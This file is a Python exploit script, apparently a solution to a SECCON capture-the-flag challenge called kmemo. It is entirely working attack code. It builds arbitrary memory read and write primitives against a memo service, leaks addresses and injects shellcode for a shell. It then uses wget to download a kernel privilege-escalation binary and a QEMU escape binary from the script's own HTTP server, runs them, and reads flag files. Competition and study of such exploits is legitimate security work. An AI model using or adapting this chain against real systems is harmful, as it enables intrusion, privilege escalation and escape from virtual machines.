#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
import socketserver

bin_file = './memo'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote', 'monitor')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  local   = {'argv':['../release/run.sh']}, \
                        remote  = {'host':'localhost', 'port':6318}, \
                        monitor = {'host':os.getenv('SECCON_HOST'), 'port':int(os.getenv('SECCON_PORT'))})
env.set_item('expsvr',  local   = {'host':'192.168.44.128', 'port':4296}, \
                        remote  = {'host':'192.168.44.128', 'port':4296}, \
                        monitor = {'host':os.getenv('KMEMO_EXPLOIT_HOST'), 'port':int(os.getenv('KMEMO_EXPLOIT_PORT'))})
env.select('monitor')

'''
addrs = psutil.net_if_addrs()
addr = addrs.get('ens33')[0].address
'''

#==========

binf = ELF(bin_file)
ofs_start           = 0x1240
ofs_ret             = 0x1298

# libc = ELF('../rootfs/lib/libc.so.6')
ofs_libc_environ    = 0x185160   # libc.symbols['envrion']

#==========

def attack_user(conn, **kwargs):
    m = Memo(conn)

    info("Trying...")
    conn.sendlineafter(b'login: ', b'ctf')

    addr_memo = u64(m.space_read((1<<30)-0x1001, 9)[1:]) - 0x100

    addr_libc_base = addr_memo + 0x3000
    info('addr_libc_base    = 0x{:08x}'.format(addr_libc_base))
    addr_libc_environ       = addr_libc_base + ofs_libc_environ

    def aar(addr):
        m.space_write((1<<30)-0x1001, b'x'+p64(addr))
        return m.memo_read(0)

    def aaw(addr, data):
        m.space_write((1<<30)-0x1001, b'y'+p64(addr))
        return m.memo_write(0, data)

    addr_stack_environ = u64(aar(addr_libc_environ)[:8])
    info('addr_stack        = 0x{:08x}'.format(addr_stack_environ))
    if addr_stack_environ & 0xf != 0:
        raise

    # aar(addr_stack_environ - 0x100)

    addr_start = u64(aar(addr_stack_environ - 0x38)[:8]) - 0x25
    binf.address = addr_start - ofs_start
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    if binf.address & 0xfff != 0:
        raise
    addr_ret = binf.address + ofs_ret

    addr_target = addr_stack_environ - 0x1a0 + 2 - 0x100
    stack  = asm(shellcraft.sh())
    stack  = stack.ljust(0xf8-2, b'\x90')
    stack += p64(addr_ret)
    stack += p16(addr_target & 0xffff)
    aaw(addr_target, stack)

class Memo:
    def __init__(self, conn):
        def sendlineafter_check(delim, data):
            x = conn.sendlineafter(delim, data, timeout=1)
            if delim not in x:
                raise
            return x

        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = sendlineafter_check

    def memo_read(self, idx):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'M> ', b'1')
        self.sendlineafter(b'Index: ', str(idx).encode())
        self.recvuntil(b'Output: ', timeout=1)
        data = self.recvuntil(b'\r\n1.', drop=True, timeout=1)
        self.sendlineafter(b'M> ', b'0')
        return data

    def memo_write(self, idx, data):
        if b'\x7f' in data:
            warn('7f contains')
            data = data.split(b'\x7f')[0]

        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'M> ', b'2')
        self.sendlineafter(b'Index: ', str(idx).encode())
        self.sendlineafter(b'Input: ', data)
        if(len(data) < 0x100):
            self.sendlineafter(b'M> ', b'0')

    def space_read(self, ofs, size):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'S> ', b'1')
        self.sendlineafter(b'Offset: ', str(ofs).encode())
        self.sendlineafter(b'Size: ', str(size).encode())
        self.recvuntil(b'Output: ', timeout=1)
        data = self.recvuntil(b'\r\n1.', drop=True, timeout=1)
        self.sendlineafter(b'S> ', b'0')
        return data

    def space_write(self, ofs, data):
        if b'\x7f' in data:
            warn('7f contains')
            data = data.split(b'\x7f')[0]

        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'S> ', b'2')
        self.sendlineafter(b'Offset: ', str(ofs).encode())
        self.sendlineafter(b'Size: ', str(len(data)).encode())
        self.sendlineafter(b'Input: ', data)
        if len(self.recvuntil(b'\r\n', drop=True, timeout=1)) < len(data):
            self.sendlineafter(b'S> ', b'0')

def lpe(conn, **kwargs):
    conn.sendlineafter(b'$ ', b'cd /tmp')
    conn.sendlineafter(b'$ ', 'wget http://{0[host]}:{0[port]}/exploit_lkm -O lkm'.format(env.expsvr).encode())
    if b'saved' not in conn.recvuntil(b'saved', timeout=2):
        return False

    conn.sendlineafter(b'$ ', b'chmod +x lkm')
    conn.sendlineafter(b'$ ', b'./lkm /dev/tmp-memo')
    return True

def escape(conn, **kwargs):
    conn.sendlineafter(b'# ', b'cd /tmp')
    conn.sendlineafter(b'# ', 'wget http://{0[host]}:{0[port]}/exploit_qemu -O qemu'.format(env.expsvr).encode())
    if b'saved' not in conn.recvuntil(b'saved', timeout=2):
        return False

    conn.sendlineafter(b'# ', b'chmod +x qemu')
    conn.sendlineafter(b'# ', b'./qemu')
    return True

def getflag(conn, **kwargs):
    if 'shebang' in kwargs:
        sb = kwargs['shebang']
        if sb not in conn.recvuntil(sb, timeout=1):
            return False
    delim = kwargs['delim'] if 'delim' in kwargs else b'\n'

    conn.sendline(b'exec 2>&1')
    conn.sendline(b'echo FLAG_HERE; cat flag*')
    conn.recvuntil(b'FLAG_HERE'+delim)
    print('FLAG : %s' % conn.recvuntil(delim, drop=True).decode().strip(), flush=True)

    return True

def hashcash(conn, **kwargs):
    if env.check('local'):
        return

    conn.recvuntil(b'hashcash ')
    opt = conn.recvline(keepends=False)

    p = process('./hashcash {}'.format(opt.decode()).split())
    p.wait_for_close()
    token = p.recv().split()[-1]
    info('token : {}'.format(token))
    conn.sendline(token)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    while True:
        comn.connect()

        comn.run(hashcash)
        while True:
            try:
                comn.run(attack_user)
                if comn.run(getflag, shebang=b'$ ', delim=b'\r\n'):
                    break
            except KeyboardInterrupt:
                exit(0)
            except:
                x = b''
                c = 0
                while b'Welcome to Buildroot' not in x:
                    comn.connection.sendline(b'0')
                    x = comn.connection.recvuntil(b'buildroot', timeout=1)
                    c += 1
                    if c > 10:
                        comn.connect()
                        break

        try:
            if not comn.run(lpe) or not comn.run(getflag, shebang=b'# ', delim=b'\r\n') or not comn.run(escape):
                continue

            comn.connection.recvuntil(b'not found')
            comn.run(getflag)
        except KeyboardInterrupt:
            exit(0)
        except:
            pass
        else:
            break
    comn.interactive()

if __name__=='__main__':
    socketserver.TCPServer.allow_reuse_address = True
    httpd = ThreadingHTTPServer(('0.0.0.0', env.expsvr['port']), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    main()

#==========
